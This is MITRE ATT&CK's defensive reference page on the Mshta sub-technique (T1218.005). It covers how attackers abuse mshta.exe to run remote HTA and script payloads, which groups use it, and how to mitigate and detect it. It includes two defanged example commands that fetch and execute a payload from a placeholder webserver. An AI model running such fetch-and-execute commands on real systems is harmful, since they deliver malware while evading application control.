MatricesEnterpriseMobileICSTacticsEnterpriseMobileICSTechniquesEnterpriseMobileICSDefensesData SourcesMitigationsEnterpriseMobileICSAssetsCTIGroupsSoftwareCampaignsResourcesGet StartedLearn More about ATT&CKATT&CKconATT&CK Data & ToolsFAQEngage with ATT&CKVersion HistoryLegal & BrandingBenefactorsBlogSearchATT&CKcon 5.0 returns October 22-23, 2024 in McLean, VA.Register heretoday!HomeTechniquesEnterpriseSystem Binary Proxy ExecutionMshtaSystem Binary Proxy Execution:MshtaOther sub-techniques of System Binary Proxy Execution (14)IDNameT1218.001Compiled HTML FileT1218.002Control PanelT1218.003CMSTPT1218.004InstallUtilT1218.005MshtaT1218.007MsiexecT1218.008OdbcconfT1218.009Regsvcs/RegasmT1218.010Regsvr32T1218.011Rundll32T1218.012VerclsidT1218.013MavinjectT1218.014MMCT1218.015Electron ApplicationsAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code[1][2][3][4][5]Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.[6]HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.[7]Files may be executed by mshta.exe through an inline script:mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))They may also be executed directly from URLs:mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.[8]ID:T1218.005Sub-technique of:T1218ⓘTactic:Defense EvasionⓘPlatforms:WindowsⓘPermissions Required:UserⓘDefense Bypassed:Application control, Digital Certificate ValidationContributors:@ionstorm; Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS BankVersion:2.0Created:23 January 2020Last Modified:11 March 2022Version PermalinkLive VersionProcedure ExamplesIDNameDescriptionG0016APT29APT29has usemshtato execute malicious scripts on a compromised host.[9]G0050APT32APT32has used mshta.exe for code execution.[10][11]S0414BabySharkBabySharkhas used mshta.exe to download and execute applications from a remote server.[12]C0015C0015DuringC0015, the threat actors usedmshtato execute DLLs.[13]G0142ConfuciusConfuciushas used mshta.exe to execute malicious VBScript.[14]G1006Earth LuscaEarth Luscahas usedmshta.exeto load an HTA script within a malicious .LNK file.[15]G0046FIN7FIN7has used mshta.exe to execute VBScript to execute malicious code on victim systems.[5]G0047Gamaredon GroupGamaredon Grouphas usedmshta.exeto execute malicious HTA files.[16]G0100InceptionInceptionhas used malicious HTA files to drop and execute malware.[17]G0094KimsukyKimsukyhas used mshta.exe to run malicious scripts on the system.[18][12][19][20]S0250KoadicKoadiccan use mshta to serve additional payloads and to help schedule tasks for persistence.[21][22]G0032Lazarus GroupLazarus Grouphas usedmshta.exeto execute HTML pages downloaded by initial access documents.[23][24]G0140LazyScripterLazyScripterhas usedmshta.exeto executeKoadicstagers.[22]S0455MetamorfoMetamorfohas used mshta.exe to execute a HTA payload.[25]G0069MuddyWaterMuddyWaterhas used mshta.exe to execute itsPOWERSTATSpayload and to pass a PowerShell one-liner for execution.[26][27]G0129Mustang PandaMustang Pandahas used mshta.exe to launch collection scripts.[28]S0228NanHaiShuNanHaiShuuses mshta.exe to load its program and files.[29]C0016Operation Dust StormDuringOperation Dust Storm, the threat actors executed JavaScript code viamshta.exe.[1]S0223POWERSTATSPOWERSTATScan use Mshta.exe to execute additional payloads on compromised hosts.[26]S0147PteranodonPteranodoncan use mshta.exe to execute an HTA file hosted on a remote server.[16]S0379Revenge RATRevenge RATuses mshta.exe to run malicious scripts on the system.[30]S0589SibotSibothas been executed via MSHTA application.[31]G1008SideCopySideCopyhas utilizedmshta.exeto execute a malicious hta file.[32]G0121SidewinderSidewinderhas usedmshta.exeto execute malicious payloads.[33][34]G1018TA2541TA2541has usedmshtato execute scripts including VBS.[35]G0127TA551TA551has used mshta.exe to execute malicious payloads.[36]S0341XbashXbashcan use mshta for executing scripts.[37]MitigationsIDMitigationDescriptionM1042Disable or Remove Feature or ProgramMshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.M1038Execution PreventionUse application control configured to block execution ofmshta.exeif it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block themshta.exeapplication and to prevent abuse.[38]DetectionIDData SourceData ComponentDetectsDS0017CommandCommand ExecutionLook for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.DS0022FileFile CreationMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspiciousDS0029Network TrafficNetwork Connection CreationMonitor for newly constructed network connections that are sent or received by untrusted hosts.DS0009ProcessProcess CreationUse process monitoring to monitor the execution and arguments of mshta.exe.ReferencesGross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.ESET. (2022, February). THREAT REPORT T3 2021. Retrieved February 10, 2022.Dahan, A. (2017, May 24). OPERATION COBALT KITTY: A LARGE-SCALE APT IN ASIA CARRIED OUT BY THE OCEANLOTUS GROUP. Retrieved November 5, 2018.Dahan, A. (2017). Operation Cobalt Kitty. Retrieved December 27, 2018.CISA, FBI, CNMF. (2020, October 27). https://us-cert.cisa.gov/ncas/alerts/aa20-301a. Retrieved November 4, 2020.DFIR Report. (2021, November 29). CONTInuing the Bazar Ransomware Story. Retrieved September 29, 2022.Lunghi, D and Horejsi, J. (2018, February 13). Deciphering Confucius: A Look at the Group's Cyberespionage Operations. Retrieved December 26, 2021.Chen, J., et al. (2022). Delving Deep: An Analysis of Earth Lusca’s Operations. Retrieved July 1, 2022.Symantec. (2022, January 31). Shuckworm Continues Cyber-Espionage Attacks Against Ukraine. Retrieved February 17, 2022.GReAT. (2019, August 12). Recent Cloud Atlas activity. Retrieved May 8, 2020.Alyac. (2019, April 3). Kimsuky Organization Steals Operation Stealth Power. Retrieved August 13, 2019.Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020.KISA. (n.d.). Phishing Target Reconnaissance and Attack Resource Analysis Operation Muzabi. Retrieved March 7, 2022.Magius, J., et al. (2017, July 19). Koadic. Retrieved June 18, 2018.Jazi, H. (2021, February). LazyScripter: From Empire to double RAT. Retrieved November 24, 2021.Saini, A. and Hossein, J. (2022, January 27). North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign. Retrieved January 27, 2022.Pradhan, A. (2022, February 8). LolZarus: Lazarus Group Incorporating Lolbins into Campaigns. Retrieved March 22, 2022.Sierra, E., Iglesias, G.. (2018, April 24). Metamorfo Campaigns Targeting Brazilian Users. Retrieved July 30, 2020.Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018.Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018.Counter Threat Unit Research Team. (2019, December 29). BRONZE PRESIDENT Targets NGOs. Retrieved April 13, 2021.F-Secure Labs. (2016, July). NANHAISHU RATing the South China Sea. Retrieved July 6, 2018.Gannon, M. (2019, February 11). With Upgrades in Delivery and Support Infrastructure, Revenge RAT Malware is a Bigger Threat. Retrieved May 1, 2019.Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence. Retrieved March 8, 2021.Threat Intelligence Team. (2021, December 2). SideCopy APT: Connecting lures victims, payloads to infrastructure. Retrieved June 13, 2022.Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.Rewterz. (2020, June 22). Analysis on Sidewinder APT Group – COVID-19. Retrieved January 29, 2021.Ventura, V. (2021, September 16). Operation Layover: How we tracked an attack on the aviation industry to five years of compromise. Retrieved September 15, 2023.Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.Xiao, C. (2018, September 17). Xbash Combines Botnet, Ransomware, Coinmining in Worm that Targets Linux and Windows. Retrieved November 14, 2018.Coulter, D. et al.. (2019, April 9). Microsoft recommended block rules. Retrieved August 12, 2021.×load more resultsContact UsTerms of UsePrivacy PolicyWebsite Changelog© 2015 - 2024, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.